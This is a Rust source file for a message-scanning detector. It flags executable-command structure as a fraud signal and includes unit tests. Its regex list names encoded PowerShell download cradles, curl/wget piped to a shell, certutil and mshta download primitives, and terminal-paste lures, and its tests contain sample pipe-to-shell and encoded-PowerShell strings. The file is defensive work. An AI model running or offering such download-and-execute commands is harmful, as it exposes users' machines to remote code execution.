//! Command Detection Engine (concept spec §6): detects *command structure*,
//! not semantic meaning. Local heuristic; the message text arrives only
//! because the caller explicitly passed it (ADR-001 privacy hierarchy — this
//! library never collects anything).

use crate::types::{
    finding, DataSourceClass, DetectorId, DetectorOutput, Provenance, RiskLevel, Subject,
    SubjectKind,
};
use regex::RegexBuilder;

pub struct CommandDetector {
    id: DetectorId,
    patterns: Vec<(regex::Regex, &'static str)>,
}

impl Default for CommandDetector {
    fn default() -> Self {
        let mk = |p: &str| {
            RegexBuilder::new(p)
                .case_insensitive(true)
                .build()
                .expect("static pattern compiles")
        };
        let patterns = vec![
            (
                mk(
                    r"powershell(\.exe)?\s+.*(-enc(odedcommand)?|iex|invoke-expression|downloadstring|bypass)",
                ),
                "encoded/download PowerShell invocation",
            ),
            (
                mk(r"\b(curl|wget)\b[^\n]{0,200}\|\s*(ba)?sh\b"),
                "pipe-to-shell download",
            ),
            (
                mk(r"\bcertutil\b.*-urlcache"),
                "certutil download primitive",
            ),
            (mk(r"\bmshta\b\s+https?://"), "mshta remote execution"),
            (mk(r"\breg\s+add\b|\bregedit\b"), "registry modification"),
            (mk(r"\bcmd(\.exe)?\s*/c\b"), "cmd /c invocation"),
            (mk(r"\bbash\s+-c\b|\bsh\s+-c\b"), "shell -c invocation"),
            (mk(r"\bosascript\b"), "AppleScript execution"),
            (
                mk(r"base64\s+(-d|--decode)[^\n]{0,80}\|\s*(ba)?sh"),
                "base64-decode piped to shell",
            ),
            (
                mk(
                    r"(paste|run|type|execute)\s+(this|the following|these)?\s*(command|script|code)[^\n]{0,40}(terminal|console|powershell|cmd\b)",
                ),
                "instruction to execute in a terminal",
            ),
            (mk(r"\bssh\s+\w+@"), "SSH connection instruction"),
            (
                mk(r"\bnpm\s+i(nstall)?\s+-g\b|\bpip\s+install\b[^\n]{0,120}--index-url"),
                "package install from instruction",
            ),
        ];
        Self {
            id: DetectorId {
                name: "command-detection".into(),
                version: "0.1.0".into(),
            },
            patterns,
        }
    }
}

impl CommandDetector {
    pub fn id(&self) -> &DetectorId {
        &self.id
    }

    pub fn accepts(&self, kind: SubjectKind) -> bool {
        kind == SubjectKind::MessageText
    }

    pub fn evaluate(&self, subject: &Subject) -> Vec<DetectorOutput> {
        let text = &subject.value;
        let hits: Vec<&str> = self
            .patterns
            .iter()
            .filter(|(re, _)| re.is_match(text))
            .map(|(_, label)| *label)
            .collect();
        if hits.is_empty() {
            return Vec::new(); // structure not found — the honest null result
        }
        let confidence = (0.6 + 0.1 * hits.len() as f64).min(0.95);
        let risk = if hits.len() >= 2 {
            RiskLevel::Critical
        } else {
            RiskLevel::High
        };
        vec![finding(
            &self.id,
            subject,
            risk,
            confidence,
            vec!["SG-INJ-001"],
            format!(
                "Message contains executable-command structure: {}. Structure detected, not intent — but unsolicited execution requests are a primary fraud mechanic.",
                hits.join("; ")
            ),
            Provenance {
                data_source_class: DataSourceClass::LocalHeuristic,
                dataset_version: None,
                mock: None,
            },
        )]
    }
}

#[cfg(test)]
mod tests {
    use super::*;

    fn eval(t: &str) -> Vec<DetectorOutput> {
        CommandDetector::default().evaluate(&Subject::text(t))
    }

    #[test]
    fn pipe_to_shell_and_encoded_powershell_hit() {
        assert!(!eval("please run: curl -sL https://x.example/i.sh | sh").is_empty());
        assert!(!eval("powershell -EncodedCommand aQBlAHgA...").is_empty());
        assert!(!eval("Paste this command into your Terminal to fix the assessment").is_empty());
    }

    #[test]
    fn two_structures_escalate_to_critical() {
        let f = eval("run cmd /c reg add HKCU\\Software ... then powershell -enc AAAA iex bypass");
        assert_eq!(f[0].risk_level, RiskLevel::Critical);
    }

    #[test]
    fn ordinary_text_produces_no_finding_not_a_low() {
        assert!(eval("Let's schedule the interview for Tuesday at 3pm.").is_empty());
        // Talking ABOUT commands without command structure:
        assert!(eval("Our tooling uses curl internally for API calls.").is_empty());
    }
}
